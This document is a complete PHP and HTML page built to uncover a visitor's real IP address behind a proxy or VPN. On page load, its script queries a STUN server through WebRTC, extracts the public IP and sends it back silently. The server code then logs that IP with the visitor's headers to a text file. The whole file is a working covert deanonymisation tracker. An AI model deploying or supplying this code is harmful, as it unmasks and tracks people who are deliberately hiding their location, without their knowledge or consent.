<?php

$data['time'] = date('Y-m-d H:i:s');
$data['HTTP_USER_AGENT'] = $_SERVER['HTTP_USER_AGENT'];
$data['HTTP_X_FORWARDED_FOR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
$data['HTTP_ACCEPT_LANGUAGE'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
@$data['HTTP_REFERER'] =$_SERVER ["HTTP_REFERER"];
@$data['ip'] = $_GET['rip'];  //代理背后的真实IP

if(!empty($data['ip'])){

    file_put_contents('filename.txt', print_r($data, true).PHP_EOL, FILE_APPEND);
}

?>
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
  <script>
    const config = {
      iceServers: [{
           urls: "stun:stun.internetcalls.com"
       }]
   };
   let pc = new RTCPeerConnection(config);
   
   pc.onicecandidate = function(event) {
     if(event.candidate)
       handleCandidate(event.candidate.candidate);
   }
   
   function handleCandidate(candidate) { 
     if (candidate.indexOf("srflx") != -1) {
       //.log(candidate)
       var regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
       var ip_addr = regex.exec(candidate)[0];
           //alert("Your public network ip: "+ ip_addr)
           console.log(ip_addr);
           var xhr = new XMLHttpRequest();
           xhr.onload = function () {
             console.log(xhr.responseText);
           }
           xhr.onerror = function () {
             console.log("请求出错");
           }
           xhr.open("GET", "?rip="+ip_addr, true);
           xhr.send();
       }  
   }
   pc.createDataChannel("");
   pc.createOffer(function(result){
     pc.setLocalDescription(result);
   }, function(){});
</script>

</body>
</html>
